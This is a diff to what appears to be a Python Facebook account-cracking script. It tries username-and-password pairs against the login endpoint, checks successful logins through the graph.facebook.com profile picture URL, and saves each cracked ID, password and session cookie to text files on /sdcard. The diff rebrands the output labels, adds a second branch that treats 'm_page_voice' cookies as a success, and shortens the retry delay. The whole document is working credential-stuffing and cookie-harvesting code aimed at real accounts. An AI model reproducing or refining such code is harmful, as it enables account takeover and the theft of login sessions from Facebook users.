@@ -487,6 +487,7 @@ def m1(ids,pwv):
     sys.stdout.flush()
     session=requests.Session()
     ua = ua_valid()
+    warna = random.choice(my_color)
     HEAD = HEADERSM1
     URSS = URLM1
     DATS = DATAM1
@@ -518,24 +519,26 @@ def m1(ids,pwv):
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                        print(f'\r\r{rad}[{green}MAHADI-💚{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m");linex()
-                        open('/sdcard/MAHADI-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/MAHADI-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
-                        ok+=1
+                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        oks+=1
                         break
-            elif 'checkpoint' in log_cookies:
+            elif 'm_page_voice' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                coki1 = coki.split("1000")[1]
-                uid = "1000"+coki1[0:11]
-                if 'y' in cp_xdx:
-                 print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{pas}')
-                 open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'|'+'\n')
-                 cp+=1
+                cid = re.findall('c_user=(.*);xs',coki)[0]
+                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        oks+=1
             else:
                 continue
         loop+=1
     except requests.exceptions.ConnectionError:
-        time.sleep(10)
+        time.sleep(7)
     except Exception as e:
         pass
 
